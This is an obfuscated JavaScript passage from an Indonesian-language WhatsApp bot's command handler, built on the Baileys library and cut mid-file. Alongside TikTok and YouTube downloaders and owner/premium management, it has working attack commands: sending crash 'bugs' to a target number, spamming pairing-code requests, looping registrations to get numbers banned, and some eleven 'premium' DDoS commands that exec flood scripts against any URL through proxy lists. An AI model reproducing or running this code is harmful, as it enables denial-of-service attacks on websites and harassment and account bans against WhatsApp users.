            return _0x2d94c9("Example: " + (_0x28d847 + _0x1a8c03) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          _0x2d94c9("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x4941e1(target);
          _0x2d94c9(_0x123a95);
        }
        break;
      case "paket?":
      case "halo_bg":
      case "kenal_abyy?":
      case "riper?":
      case "lawak_ngerip":
      case 'assalamualaikum':
      case 'openvcs?':
      case 'lawak_suki':
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          _0x2d94c9("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x16ba4a(target, _0x18765d, cct = false, ptcp = false);
          await _0x16ba4a(target, _0x18765d, cct = false, ptcp = false);
          _0x2d94c9(_0x45a961);
        }
        break;
      case "spampair":
        {
          if (!_0x14f0d6) {
            return _0x2d94c9(mess.owner);
          }
          if (!q) {
            return _0x2d94c9("*Syntax Error!*\n\n_Use : Spampair NUMBER|AMOUNT_\n_Example : Spampair 62xx\n\n𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚🎭");
          }
          let [_0x295921, _0x129d58 = "200"] = q.split('|');
          await _0x2d94c9("</> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙥𝙖𝙢 𝘾𝙤𝙙𝙚〽️");
          let _0x2bc28a = _0x295921.replace(/[^0-9]/g, '').trim();
          let {
            default: _0x5f2d8c,
            useMultiFileAuthState: _0x2e3162,
            fetchLatestBaileysVersion: _0x29f1af
          } = require("@whiskeysockets/baileys@^6.4.0");
          let {
            state: _0x1311fe
          } = await _0x2e3162("ThebyxxWangsaff");
          let {
            version: _0x3ecd78
          } = await _0x29f1af();
          let _0x24544d = await _0x5f2d8c({
            'auth': _0x1311fe,
            'version': _0x3ecd78,
            'logger': pino({
              'level': "fatal"
            })
          });
          for (let _0xd52b4f = 0x0; _0xd52b4f < _0x129d58; _0xd52b4f++) {
            await sleep(0x5dc);
            let _0x5c25cb = await _0x24544d.requestPairingCode(_0x2bc28a);
            await console.log("# Succes Spam Pairing Code - Number : " + _0x2bc28a + " - Code : " + _0x5c25cb);
          }
          await sleep(0x3a98);
        }
        break;
      case "tempban":
        {
          if (!_0x14f0d6) {
            return _0x2d94c9(mess.owner);
          }
          if (_0x47ea36.length < 0x1) {
            return _0x2d94c9("*Syntax Error!*\n\n_Use : Tempban ID|NO_\n_Example : Tempban 62|819\n\n𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚🎭");
          }
          const _0x296e34 = _0x47ea36[0x0].split('|');
          if (_0x296e34.length !== 0x2) {
            return _0x2d94c9("Syntax Error!*\n\n_Use : Tempban ID|NO_\n_Example : Tempban 62|819_\n\n𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚🎭");
          }
          await _0x2d94c9("</> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙥𝙖𝙢 𝘾𝙤𝙙𝙚〽️");
          try {
            const {
              statebyxx: _0x5849f3,
              saveCredsbyxx: _0x2cd5a1
            } = await useMultiFileAuthState('./TheGetsuzoZhiro');
          } catch (_0x3787f2) {}
          for (let _0x520bef = 0x0; _0x520bef < 0x2710; _0x520bef++) {
            try {
              var _0xf8b521 = Math.floor(Math.random() * 0x3e7);
              var _0x623ff9 = Math.floor(Math.random() * 0x3e7);
              await _0x488b14.register(_0xf8b521 + '-' + _0x623ff9);
            } catch (_0x16e5e7) {
              console.log(_0xf8b521 + '-' + _0x623ff9);
            }
          }
        }
        break;
      case "ddos":
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x287ada = q.split(" ")[0x0];
          let _0x4ac4cd = q.split(" ")[0x1];
          let _0x33bf0e = q.split(" ")[0x2];
          let _0x2155a6 = q.split(" ")[0x3];
          if (_0x47ea36.length === 0x4 && _0x287ada && _0x4ac4cd && _0x33bf0e && _0x2155a6) {
            _0x2d94c9("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + _0x287ada + " 🎭 Serangan Berlangsung Selama " + _0x4ac4cd + " Detik.");
            exec("node ./ddos/hentai.js " + _0x287ada + " " + _0x4ac4cd + " " + _0x2155a6 + " " + _0x33bf0e + " proxy.txt", (_0x184bea, _0x2afe7a) => {
              if (_0x184bea) {
                return console.log(_0x184bea.toString());
              }
              if (_0x2afe7a) {
                return console.log(util.format(_0x2afe7a));
              }
            });
          } else {
            _0x2d94c9("Format Pesan Tidak Benar. Gunakan Format : Ddos [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case 'xc':
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let [_0x1f4a61, _0x2ad971, _0x59c6a6, _0x5293a0, _0x1015e4] = q.split(" ");
          if (_0x47ea36.length === 0x5 && _0x1f4a61 && _0x2ad971 && _0x59c6a6 && _0x5293a0 && _0x1015e4) {
            _0x2d94c9("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju: " + _0x1f4a61 + " 🎭 Serangan Berlangsung Selama " + _0x2ad971 + " Detik.");
            exec("node ./ddos/LC.js " + _0x1f4a61 + " " + _0x2ad971 + " " + _0x59c6a6 + " " + _0x5293a0 + " proxy.txt", (_0x3b07f5, _0xeccb7b) => {
              if (_0x3b07f5) {
                return console.log(_0x3b07f5.toString());
              }
              if (_0xeccb7b) {
                return console.log(util.format(_0xeccb7b));
              }
            });
          } else {
            _0x2d94c9("Format Pesan Tidak Benar. Gunakan Format: Xc [Url] [Time] [Rate] [Thread] [ProxyFile]");
          }
        }
        break;
      case 'mix':
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x3a0c06 = q.split(" ")[0x0];
          let _0x52b1c9 = q.split(" ")[0x1];
          let _0x583d7a = q.split(" ")[0x2];
          let _0x470855 = q.split(" ")[0x3];
          if (_0x47ea36.length === 0x4 && _0x3a0c06 && _0x52b1c9 && _0x583d7a && _0x470855) {
            _0x2d94c9("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + _0x3a0c06 + " 🎭 Serangan Berlangsung Selama " + _0x52b1c9 + " Detik.");
            exec("node ./ddos/mix.js " + _0x3a0c06 + " " + _0x52b1c9 + " " + _0x583d7a + " " + _0x470855, (_0x275bf9, _0xefa4dd) => {
              if (_0x275bf9) {
                return console.log(_0x275bf9.toString());
              }
              if (_0xefa4dd) {
                return console.log(util.format(_0xefa4dd));
              }
            });
          } else {
            _0x2d94c9("Format Pesan Tidak Benar. Gunakan Format : Mix [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "floods":
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0xffb41b = q.split(" ")[0x0];
          let _0x3f9412 = q.split(" ")[0x1];
          let _0x2e36e7 = q.split(" ")[0x2];
          let _0x51f5c9 = q.split(" ")[0x3];
          if (_0x47ea36.length === 0x4 && _0xffb41b && _0x3f9412 && _0x2e36e7 && _0x51f5c9) {
            _0x2d94c9("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + _0xffb41b + " 🎭 Serangan Berlangsung Selama " + _0x3f9412 + " Detik.");
            exec("node ./ddos/floods.js " + _0xffb41b + " " + _0x3f9412 + " " + _0x51f5c9 + " " + _0x2e36e7 + " proxy.txt", (_0x24f2c0, _0xc55030) => {
              if (_0x24f2c0) {
                return console.log(_0x24f2c0.toString());
              }
              if (_0xc55030) {
                return console.log(util.format(_0xc55030));
              }
            });
          } else {
            _0x2d94c9("Format Pesan Tidak Benar. Gunakan Format : Floods [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case 'ua':
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x58a47e = q.split(" ")[0x0];
          let _0x301281 = q.split(" ")[0x1];
          let _0x3cc174 = q.split(" ")[0x2];
          let _0x19817f = q.split(" ")[0x3];
          if (_0x47ea36.length === 0x4 && _0x58a47e && _0x301281 && _0x3cc174 && _0x19817f) {
            _0x2d94c9("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + _0x58a47e + " 🎭 Serangan Berlangsung Selama " + _0x301281 + " Detik.");
            exec("node ./ddos/kilua.js " + _0x58a47e + " " + _0x301281 + " " + _0x3cc174 + " proxy.txt " + _0x19817f + " ua.txt", (_0x2d209f, _0x10649b) => {
              if (_0x2d209f) {
                return console.log(_0x2d209f.toString());
              }
              if (_0x10649b) {
                return console.log(util.format(_0x10649b));
              }
            });
          } else {
            _0x2d94c9("Format Pesan Tidak Benar. Gunakan Format : Ua [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "xchrome":
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x2a0258 = q.split(" ")[0x0];
          let _0xeb54a2 = q.split(" ")[0x1];
          let _0x211cbf = q.split(" ")[0x2];
          let _0x1edf35 = q.split(" ")[0x3];
          if (_0x47ea36.length === 0x4 && _0x2a0258 && _0xeb54a2 && _0x211cbf && _0x1edf35) {
            _0x2d94c9("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + _0x2a0258 + " 🎭 Serangan Berlangsung Selama " + _0xeb54a2 + " Detik.");
            exec("node ./ddos/chromev3.js " + _0x2a0258 + " " + _0xeb54a2 + " " + _0x1edf35 + " " + _0x211cbf + " proxy.txt", (_0x1cd16e, _0x124aaa) => {
              if (_0x1cd16e) {
                return console.log(_0x1cd16e.toString());
              }
              if (_0x124aaa) {
                return console.log(util.format(_0x124aaa));
              }
            });
          } else {
            _0x2d94c9("Format Pesan Tidak Benar. Gunakan Format Xchrome [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "tls":
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x396c3c = q.split(" ")[0x0];
          let _0x1cbaad = q.split(" ")[0x1];
          let _0x438b2d = q.split(" ")[0x2];
          let _0x4adb08 = q.split(" ")[0x3];
          if (_0x47ea36.length === 0x4 && _0x396c3c && _0x1cbaad && _0x438b2d && _0x4adb08) {
            _0x2d94c9("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + _0x396c3c + " 🎭 Serangan Berlangsung Selama " + _0x1cbaad + " Detik.");
            exec("node ./ddos/tls-arz.js " + _0x396c3c + " " + _0x1cbaad + " " + _0x4adb08 + " " + _0x438b2d + " proxy.txt", (_0x35f0f6, _0x354654) => {
              if (_0x35f0f6) {
                return console.log(_0x35f0f6.toString());
              }
              if (_0x354654) {
                return console.log(util.format(_0x354654));
              }
            });
          } else {
            _0x2d94c9("Format Pesan Tidak Benar. Gunakan Format Tls [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "tlsbypass":
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x304536 = q.split(" ")[0x0];
          let _0x4d9f0f = q.split(" ")[0x1];
          let _0x32b6c2 = q.split(" ")[0x2];
          let _0x3faf64 = q.split(" ")[0x3];
          if (_0x47ea36.length === 0x4 && _0x304536 && _0x4d9f0f && _0x32b6c2 && _0x3faf64) {
            _0x2d94c9("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + _0x304536 + " 🎭 Serangan Berlangsung Selama " + _0x4d9f0f + " Detik.");
            exec("node ./ddos/tls-bypass.js " + _0x304536 + " " + _0x4d9f0f + " " + _0x3faf64 + " " + _0x32b6c2, (_0x459ffc, _0x1de2d6) => {
              if (_0x459ffc) {
                return console.log(_0x459ffc.toString());
              }
              if (_0x1de2d6) {
                return console.log(util.format(_0x1de2d6));
              }
            });
          } else {
            _0x2d94c9("Format Pesan Tidak Benar. Gunakan Format Tlsbypass [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "tlsv2":
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x284627 = q.split(" ")[0x0];
          let _0x550e90 = q.split(" ")[0x1];
          let _0x1706d6 = q.split(" ")[0x2];
          let _0x1482ec = q.split(" ")[0x3];
          if (_0x47ea36.length === 0x4 && _0x284627 && _0x550e90 && _0x1706d6 && _0x1482ec) {
            _0x2d94c9("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + _0x284627 + " 🎭 Serangan Berlangsung Selama " + _0x550e90 + " Detik.");
            exec("node ./ddos/tls.js " + _0x284627 + " " + _0x550e90 + " " + _0x1482ec + " " + _0x1706d6 + " proxy.txt", (_0x35d1f0, _0x49fa5d) => {
              if (_0x35d1f0) {
                return console.log(_0x35d1f0.toString());
              }
              if (_0x49fa5d) {
                return console.log(util.format(_0x49fa5d));
              }
            });
          } else {
            _0x2d94c9("Format Pesan Tidak Benar. Gunakan Format Tlsv2 [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "bypass-cf":
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x301b69 = q.split(" ")[0x0];
          let _0x50f290 = q.split(" ")[0x1];
          let _0x146d91 = q.split(" ")[0x2];
          let _0x39db88 = q.split(" ")[0x3];
          if (_0x47ea36.length === 0x4 && _0x301b69 && _0x50f290 && _0x146d91 && _0x39db88) {
            _0x2d94c9("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + _0x301b69 + " 🎭 Serangan Berlangsung Selama " + _0x50f290 + " Detik.");
            exec("node ./ddos/bypass.js " + _0x301b69 + " " + _0x50f290 + " " + _0x39db88 + " " + _0x146d91 + " proxy.txt", (_0x38759b, _0x425bb6) => {
              if (_0x38759b) {
                return console.log(_0x38759b.toString());
              }
              if (_0x425bb6) {
                return console.log(util.format(_0x425bb6));
              }
            });
          } else {
            _0x2d94c9("Format Pesan Tidak Benar. Gunakan Format : Bypass-cf [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case 'tls-vip':
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x4fbcc2 = q.split(" ")[0x0];
          let _0x4a3040 = q.split(" ")[0x1];
          let _0x582df8 = q.split(" ")[0x2];
          let _0x1a136f = q.split(" ")[0x3];
          if (_0x47ea36.length === 0x4 && _0x4fbcc2 && _0x4a3040 && _0x582df8 && _0x1a136f) {
            _0x2d94c9("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + _0x4fbcc2 + " 🎭 Serangan Berlangsung Selama " + _0x4a3040 + " Detik.");
            exec("node ./ddos/tlsvip.js " + _0x4fbcc2 + " " + _0x4a3040 + " " + _0x1a136f + " " + _0x582df8 + " proxy.txt", (_0x3d8394, _0x145576) => {
              if (_0x3d8394) {
                return console.log(_0x3d8394.toString());
              }
              if (_0x145576) {
                return console.log(util.format(_0x145576));
              }
            });
          } else {
            _0x2d94c9("Format Pesan Tidak Benar. Gunakan Format Tls-vip [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "tiktokslide":
      case "ttslide":
        {
          if (!_0x5592c0) {
            return _0x2d94c9("*Example :* \n\n*Tiktokdl Link Url*");
          }
          if (!_0x5592c0.includes('tiktok.com')) {
            return _0x2d94c9("Url Tidak Mengandung Result Dari Tiktok!");
          }
          _0x2d94c9("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 💫");
          try {
            let _0x4e5f34 = _0x47ea36[0x0];
            if (!_0x4e5f34) {
              return _0x2d94c9("Masukkan URL TikTok Terlebih Dahulu.");
            }
            let _0x5b75c4 = await fetch('https://api.betabotz.eu.org/api/download/ttslide?url=' + _0x4e5f34 + "&apikey=GetsuzoZhiro");
            let _0x14c8a4 = await _0x5b75c4.json();
            if (!_0x14c8a4.status) {
              return _0x2d94c9("Gagal Mengambil Data, Coba Lagi.");
            }
            let _0x12568f = _0x14c8a4.result.images;
            let _0x1181f9 = _0x14c8a4.result.title || "TikTok Slide";
            let _0x27c2cd = _0x14c8a4.result.totalSlide || "Total Slide";
            const _0x3c08c9 = async _0x4af927 => {
              const {
                imageMessage: _0x198ba7
              } = await generateWAMessageContent({
                'image': {
                  'url': _0x4af927
                }
              }, {
                'upload': _0x488b14.waUploadToServer
              });
              return _0x198ba7;
            };
            const _0x35010b = await Promise.all(_0x12568f.map(async (_0x5b5459, _0x28dc6f) => ({
              'header': proto.Message.InteractiveMessage.Header.fromObject({
                'title': gris + "IMAGE " + (_0x28dc6f + 0x1) + gris,
                'hasMediaAttachment': true,
                'imageMessage': await _0x3c08c9(_0x5b5459)
              }),
              'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                'buttons': []
              })
            })));
            const _0x1536da = generateWAMessageFromContent(_0x257ec2.chat, {
              'viewOnceMessage': {
                'message': {
                  'messageContextInfo': {
                    'deviceListMetadata': {},
                    'deviceListMetadataVersion': 0x2
                  },
                  'interactiveMessage': proto.Message.InteractiveMessage.fromObject({
                    'body': proto.Message.InteractiveMessage.Body.fromObject({
                      'text': "> " + gris + "[TIKTOK FOTO SLIDE]" + gris + "\n\n" + hiasan + "Total Foto : " + _0x27c2cd + "\n" + hiasan + _0x1181f9
                    }),
                    'carouselMessage': proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                      'cards': _0x35010b
                    })
                  })
                }
              }
            }, {});
            await _0x488b14.relayMessage(_0x1536da.key.remoteJid, _0x1536da.message, {
              'messageId': _0x1536da.key.id
            });
            await _0x488b14.sendButtons(_0x257ec2.chat, {
              'body': "``「 " + gris + "[ T I K T O K ]" + gris + " 」``\n\n  *›  UNDUH AUDIO*\n" + hiasan + "*Author* : " + packname,
              'footer': "⿻  ⌜ 𝐁𝐲𝐱𝐱𝐇𝐚𝐫𝐝𝐞𝐫🐉 ⌟  ⿻",
              'buttons': [{
                'displayText': '𝐒𝐎𝐔𝐍𝐃𝐒',
                'id': "ttmp3 " + q
              }]
            }, {
              'quoted': Zets
            });
          } catch (_0x594c87) {
            _0x2d94c9("Terjadi kesalahan, coba lagi nanti.");
            console.error(_0x594c87);
          }
        }
        break;
      case "tiktok":
        {
          if (!_0x5592c0) {
            return _0x2d94c9("*Example :*\n\n*Tiktokdl Link Url*");
          }
          if (!_0x5592c0.includes('tiktok.com')) {
            return _0x2d94c9("Url Tidak Mengandung Result Dari Tiktok!");
          }
          _0x2d94c9("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 💫");
          try {
            let _0x171774 = await fetch("https://api.betabotz.eu.org/api/download/tiktok?url=" + encodeURIComponent(_0x5592c0) + "&apikey=GetsuzoZhiro");
            let _0x2d6586 = await _0x171774.json();
            if (!_0x2d6586.status) {
              return _0x2d94c9("Gagal mendapatkan data dari API.");
            }
            const {
              title: _0x2ec516,
              video: _0x4b406e,
              audio: _0x4ea16e
            } = _0x2d6586.result;
            await _0x488b14.sendMessage(_0x257ec2.chat, {
              'video': {
                'url': _0x4b406e[0x0]
              },
              'caption': gris + "[ T I K T O K ]" + gris + "\n\n*› Title :* " + _0x2ec516,
              'mimetype': "video/mp4"
            }, {
              'quoted': Zets
            });
            await _0x488b14.sendButtons(_0x257ec2.chat, {
              'body': "``「 " + gris + "[ T I K T O K ]" + gris + " 」``\n\n  *›  UNDUH AUDIO*\n" + hiasan + "*Title :* " + _0x2ec516,
              'footer': "⿻  ⌜ 𝐁𝐲𝐱𝐱𝐇𝐚𝐫𝐝𝐞𝐫🐉 ⌟  ⿻",
              'buttons': [{
                'displayText': "𝐒𝐎𝐔𝐍𝐃𝐒",
                'id': "ttmp3 " + q
              }]
            }, {
              'quoted': Zets
            });
          } catch (_0x1a0e03) {
            _0x2d94c9("Terjadi Kesalahan Saat Menghubungi API.");
            console.error(_0x1a0e03);
          }
        }
        break;
      case "ttmp4":
      case "ttdl":
        {
          if (!_0x5592c0) {
            return _0x2d94c9("*Example :* \n\n*Tiktokdl Link Url*");
          }
          if (!_0x5592c0.includes("tiktok.com")) {
            return _0x2d94c9("Url Tidak Mengandung Result Dari Tiktok!");
          }
          const _0x3d6f6b = await tiktokDl(_0x5592c0);
          _0x2d94c9("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 💫");
          if (_0x3d6f6b.size_nowm) {
            await _0x488b14.sendFileUrl(_0x257ec2.chat, _0x3d6f6b.data[0x1].url, gris + "[ T I K T O K ]" + gris + "\n\n" + hiasan + "*Author* : " + _0x3d6f6b.author.nickname + "\n" + hiasan + "*Capiton* : " + _0x3d6f6b.title, Zets);
            await _0x488b14.sendButtons(_0x257ec2.chat, {
              'body': "``「 " + gris + "[ T I K T O K ]" + gris + " 」``\n\n  *›  UNDUH AUDIO*\n" + hiasan + "*Author* : " + _0x3d6f6b.author.nickname,
              'footer': "⿻  ⌜ 𝐁𝐲𝐱𝐱𝐇𝐚𝐫𝐝𝐞𝐫🐉 ⌟  ⿻",
              'buttons': [{
                'displayText': "𝐒𝐎𝐔𝐍𝐃𝐒",
                'id': "ttmp3 " + q
              }]
            }, {
              'quoted': Zets
            });
          } else {
            for (let _0x49a5b9 = 0x0; _0x49a5b9 < _0x3d6f6b.data.length; _0x49a5b9++) {
              await _0x488b14.sendFileUrl(_0x257ec2.chat, _0x3d6f6b.data[_0x49a5b9].url, gris + "[ I M A G E ]" + gris, Zets);
            }
            await _0x488b14.sendButtons(_0x257ec2.chat, {
              'body': "``「 " + gris + "[ T I K T O K ]" + gris + " 」``\n\n  *›  UNDUH AUDIO*\n" + hiasan + "*Author* : " + _0x3d6f6b.author.nickname,
              'footer': "⿻  ⌜ 𝐁𝐲𝐱𝐱𝐇𝐚𝐫𝐝𝐞𝐫🐉 ⌟  ⿻",
              'buttons': [{
                'displayText': "𝐒𝐎𝐔𝐍𝐃𝐒",
                'id': "ttmp3 " + q
              }]
            }, {
              'quoted': Zets
            });
          }
        }
        break;
      case 'ttmp3':
        {
          if (!_0x5592c0) {
            return _0x2d94c9("*Example:*\n\n*Ttmp3 Link Url*");
          }
          if (!_0x5592c0.includes("tiktok.com")) {
            return _0x2d94c9("Url Tidak Mengandung Result Dari Tiktok!");
          }
          const _0x12fe2b = await tiktokDl(_0x5592c0);
          _0x2d94c9("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 💫");
          await _0x488b14.sendMessage(_0x257ec2.chat, {
            'audio': {
              'url': _0x12fe2b.music_info.url
            },
            'mimetype': "audio/mpeg",
            'contextInfo': {
              'externalAdReply': {
                'title': "TikTok • " + _0x12fe2b.author.nickname,
                'body': _0x12fe2b.stats.likes + " Suka, " + _0x12fe2b.stats.comment + " Komentar. " + _0x12fe2b.title,
                'previewType': "PHOTO",
                'thumbnailUrl': _0x12fe2b.cover,
                'mediaType': 0x1,
                'renderLargerThumbnail': true,
                'sourceUrl': _0x5592c0
              }
            }
          }, {
            'quoted': Zets
          });
        }
        break;
      case "play":
        {
          if (!_0x5592c0) {
            return _0x2d94c9("*Example :*\n\n*Play *nama lagu* *");
          }
          _0x2d94c9("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 💫");
          let _0x1091ba = require('youtube-yts');
          let _0x58c206 = await _0x1091ba(_0x5592c0);
          let _0x1c86b6 = _0x58c206.videos[0x0];
          const _0x20eb7c = await youtube(_0x1c86b6.url);
          await _0x488b14.sendMessage(_0x257ec2.chat, {
            'audio': {
              'url': _0x20eb7c.mp3
            },
            'fileName': _0x1c86b6.title + '.mp3',
            'mimetype': 'audio/mpeg',
            'contextInfo': {
              'externalAdReply': {
                'title': _0x1c86b6.title,
                'body': packname,
                'thumbnailUrl': _0x1c86b6.image,
                'sourceUrl': _0x20eb7c.mp3,
                'mediaType': 0x1,
                'mediaUrl': _0x1c86b6.url
              }
            }
          }, {
            'quoted': Zets
          });
        }
        break;
      case 'owner':
        {
          if (!_0x55dc4) {
            return _0x2d94c9("Mau Ngapain Dek ??");
          }
          const _0x36fa3d = await _0x488b14.sendMessage(_0x43890b, {
            'contacts': {
              'displayName': _0x1d6bee.length + " Kontak",
              'contacts': _0x1d6bee
            },
            'contextInfo': {
              'forwardingScore': 0x98967f,
              'isForwarded': true,
              'mentionedJid': [_0x3bd3c5]
            }
          }, {
            'quoted': _0x257ec2
          });
          _0x488b14.sendMessage(_0x43890b, {
            'text': "Nih Owner Gw Jangan Macem\"",
            'contextInfo': {
              'forwardingScore': 0x98967f,
              'isForwarded': true,
              'mentionedJid': [_0x3bd3c5]
            }
          }, {
            'quoted': _0x36fa3d
          });
        }
        break;
      case "addowner":
        if (!_0x14f0d6) {
          return _0x2d94c9(mess.only.owner);
        }
        if (!_0x47ea36[0x0]) {
          return _0x2d94c9("Penggunaan " + (_0x28d847 + _0x1a8c03) + " nomor\nContoh " + (_0x28d847 + _0x1a8c03) + " 62×××");
        }
        bnnd = q.split('|')[0x0].replace(/[^0-9]/g, '');
        let _0x438f02 = await _0x488b14.onWhatsApp(bnnd + "@s.whatsapp.net");
        if (_0x438f02.length == 0x0) {
          return _0x2d94c9("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!");
        }
        _0x51aca6.push(bnnd);
        fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(_0x51aca6));
        _0x2d94c9("Nomor " + bnnd + " Telah Menjadi Owner!!!");
        break;
      case "delowner":
        if (!_0x14f0d6) {
          return _0x2d94c9(mess.only.owner);
        }
        if (!_0x47ea36[0x0]) {
          return _0x2d94c9("Penggunaan " + (_0x28d847 + _0x1a8c03) + " nomor\nContoh " + (_0x28d847 + _0x1a8c03) + " 62×××");
        }
        ya = q.split('|')[0x0].replace(/[^0-9]/g, '');
        unp = _0x51aca6.indexOf(ya);
        _0x51aca6.splice(unp, 0x1);
        fs.writeFileSync("./database/dtbs/owner.json", JSON.stringify(_0x51aca6));
        _0x2d94c9("Nomor " + ya + " Telah Di Hapus Owner!!!");
        break;
      case 'setowner':
        {
          if (!_0x14f0d6) {
            return _0x2d94c9("kusus owner");
          }
          if (!_0x5592c0) {
            return _0x2d94c9("Contoh : " + (_0x28d847 + _0x1a8c03) + " 62×××");
          }
          global.owner = _0x5592c0.split('|')[0x0];
          _0x2d94c9("Exif berhasil diubah menjadi\n\n• No Owner : " + global.owner);
        }
        break;
      case "self":
        {
          if (!_0x14f0d6) {
            return _0x2d94c9(mess.only.owner);
          }
          _0x488b14["public"] = false;
          _0x2d94c9("Succes Mode Private");
        }
        break;
      case "addprem":
        {
          if (!_0x14f0d6) {
            return _0x2d94c9(mess.only.owner);
          }
          if (!_0x47ea36[0x0]) {
            return _0x2d94c9("Penggunaan " + (_0x28d847 + _0x1a8c03) + " nomor\nContoh " + (_0x28d847 + _0x1a8c03) + " 62×××");
          }
          prrkek = q.split('|')[0x0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          let _0x11110e = await _0x488b14.onWhatsApp(prrkek);
          if (_0x11110e.length == 0x0) {
            return _0x2d94c9("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!");
          }
          _0x540ab1.push(prrkek);
          fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(_0x540ab1));
          _0x2d94c9("Nomor " + prrkek + " Telah Menjadi Premium!");
        }
        break;
      case 'delprem':
        {
          if (!_0x14f0d6) {
            return _0x2d94c9(mess.only.owner);
          }
          if (!_0x47ea36[0x0]) {
            return _0x2d94c9("Penggunaan " + (_0x28d847 + _0x1a8c03) + " nomor\nContoh " + (_0x28d847 + _0x1a8c03) + " 62×××");
          }
          ya = q.split('|')[0x0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          unp = _0x540ab1.indexOf(ya);
          _0x540ab1.splice(unp, 0x1);
          fs.writeFileSync('./database/dtbs/premium.json', JSON.stringify(_0x540ab1));
          _0x2d94c9("Nomor " + ya + " Telah Di Hapus Premium!");
        }
        break;
      case 'public':
        {
          if (!_0x14f0d6) {
            return _0x2d94c9(mess.only.owner);
          }
          _0x488b14["public"] = true;
          _0x2d94c9("Succes Mode Public");
        }
        break;
      case 'qc':
        {
          if (!_0x14f0d6) {
            return _0x2d94c9(mess.only.owner);
          }
          if (!_0x452409) {} else {
            if (q) {} else {
              _0x2d94c9("Kirim perintah " + (_0x28d847 + _0x1a8c03) + " byxxTzy");
            }
          }
        }
        break;
      case "mangap":
        {
          _0x2d94c9("Makasi Kakak " + _0x2b0ab7 + " Atas Pujiannya");
        }
        break;
      case 'ai':
        {
          if (!_0x5592c0) {
            return _0x2d94c9("*• Example:* " + (_0x28d847 + _0x1a8c03) + " Siapakah orang yang telah menemukan Komputer di jaman Majapahit");
          }
          await _0x488b14.sendMessage(_0x257ec2.chat, {
            'react': {
              'text': '⏱️',
              'key': _0x257ec2.key
            }
          });
          try {
            let _0x3731fe = await (await fetch('https://widipe.com/openai?text=' + _0x5592c0)).json();
            let _0x4c6316 = generateWAMessageFromContent(_0x257ec2.chat, {
              'viewOnceMessage': {
                'message': {
                  'messageContextInfo': {
                    'deviceListMetadata': {},
                    'deviceListMetadataVersion': 0x2
                  },
                  'interactiveMessage': proto.Message.InteractiveMessage.create({
                    'body': proto.Message.InteractiveMessage.Body.create({
                      'text': "> byxx - AI\n\n" + _0x3731fe.result
                    }),
                    'footer': proto.Message.InteractiveMessage.Footer.create({
                      'text': namabot
                    }),
                    'header': proto.Message.InteractiveMessage.Header.create({
                      'hasMediaAttachment': false,
                      ...(await prepareWAMessageMedia({
                        'image': fs.readFileSync("./image/byzx.jpg")
                      }, {
                        'upload': _0x488b14.waUploadToServer
                      }))
                    }),
